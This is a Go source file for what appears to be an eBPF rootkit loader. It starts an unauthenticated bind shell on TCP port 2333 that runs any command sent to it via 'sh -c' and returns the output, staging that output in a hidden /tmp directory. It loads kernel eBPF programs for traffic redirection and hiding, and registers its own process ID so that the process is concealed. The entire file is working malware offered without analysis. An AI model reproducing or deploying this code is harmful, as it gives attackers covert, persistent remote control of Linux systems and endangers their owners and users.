package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/cilium/ebpf"
)

const (
	PORT        = 2333
	HIDDEN_DIR  = "/tmp/.rkit_vault"
	OUTPUT_FILE = "/tmp/.rkit_vault/rkit_out.txt"
	BANNER      = "Welcome to eBPF Rootkit Shell\n$ "
	END_MARKER  = "\n--- END ---\n$ "
)

func setupEnvironment() {
	if _, err := os.Stat(HIDDEN_DIR); os.IsNotExist(err) {
		os.Mkdir(HIDDEN_DIR, 0777)
	}
}

func executeCommand(conn net.Conn, cmd string) {
	cmd = strings.TrimSpace(cmd)

	fullCmd := fmt.Sprintf("%s > %s 2>&1", cmd, OUTPUT_FILE)
	exec.Command("sh", "-c", fullCmd).Run()

	data, err := os.ReadFile(OUTPUT_FILE)
	if err != nil {
		msg := "Error: Could not read output file.\n"
		conn.Write([]byte(msg))
		return
	}

	conn.Write(data)
	conn.Write([]byte(END_MARKER))
}

func handleClient(conn net.Conn) {
	defer conn.Close()

	conn.Write([]byte(BANNER))

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		cmd := scanner.Text()
		if strings.TrimSpace(cmd) == "exit" {
			break
		}

		if strings.TrimSpace(cmd) != "" {
			executeCommand(conn, cmd)
		}
	}
}

func startCommandServer() {
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", PORT))
	if err != nil {
		fmt.Printf("[-] Failed to listen on port %d: %v\n", PORT, err)
		return
	}
	defer listener.Close()

	fmt.Printf("[+] Command server listening on port %d\n", PORT)

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Printf("[-] Accept error: %v\n", err)
			continue
		}

		go handleClient(conn)
	}
}

func loadBPFModules() {
	outputDir := ".output"

	fmt.Println("[+] Starting eBPF module loading test...")
	fmt.Printf("[*] Looking for BPF objects in: %s\n", outputDir)

	bpfObjects := []string{
		"ingress_redirect.bpf.o",
		"egress_restore.bpf.o",
		"ip_check.bpf.o",
		"hiding.bpf.o",
	}

	for _, objName := range bpfObjects {
		objPath := filepath.Join(outputDir, objName)
		fmt.Printf("\n[*] Loading: %s\n", objPath)

		if _, err := os.Stat(objPath); err != nil {
			if os.IsNotExist(err) {
				fmt.Printf("[-] File not found: %s\n", objPath)
				continue
			}
			fmt.Printf("[-] Error accessing file: %v\n", err)
			continue
		}

		spec, err := ebpf.LoadCollectionSpec(objPath)
		if err != nil {
			fmt.Printf("[-] Failed to load BPF collection spec: %v\n", err)
			continue
		}

		fmt.Printf("[+] Collection spec loaded successfully\n")
		fmt.Printf("    Programs: %d\n", len(spec.Programs))
		fmt.Printf("    Maps: %d\n", len(spec.Maps))

		for progName, progSpec := range spec.Programs {
			fmt.Printf("    - Program: %s (Type: %s, Section: %s)\n",
				progName, progSpec.Type, progSpec.SectionName)
		}

		for mapName, mapSpec := range spec.Maps {
			fmt.Printf("    - Map: %s (Type: %s)\n", mapName, mapSpec.Type)
		}

		coll, err := ebpf.NewCollectionWithOptions(spec, ebpf.CollectionOptions{
			Programs: ebpf.ProgramOptions{},
			Maps: ebpf.MapOptions{
				PinPath: "/sys/fs/bpf", 
			},
		})
		if err != nil {
			fmt.Printf("[-] Failed to load programs into kernel: %v\n", err)
			continue
		}

		fmt.Printf("[+] Successfully loaded into kernel!\n")

		for progName, prog := range coll.Programs {
			fmt.Printf("    - Loaded program: %s (FD: %d)\n", progName, prog.FD())
		}

		if objName == "hiding.bpf.o" {
			if configMap, exists := coll.Maps["config_map"]; exists {
				pid := uint64(os.Getpid())
				key := uint32(0) 
				if err := configMap.Put(key, pid); err != nil {
					fmt.Printf("[-] Failed to set hidden PID in config_map: %v\n", err)
				} else {
					fmt.Printf("[+] Set hidden PID to %d\n", pid)
				}
			}
		}
		_ = coll
	}

	fmt.Println("\n[+] BPF module loading test complete")
}

func main() {
	setupEnvironment()

	go startCommandServer()

	go loadBPFModules()

	select {}
}
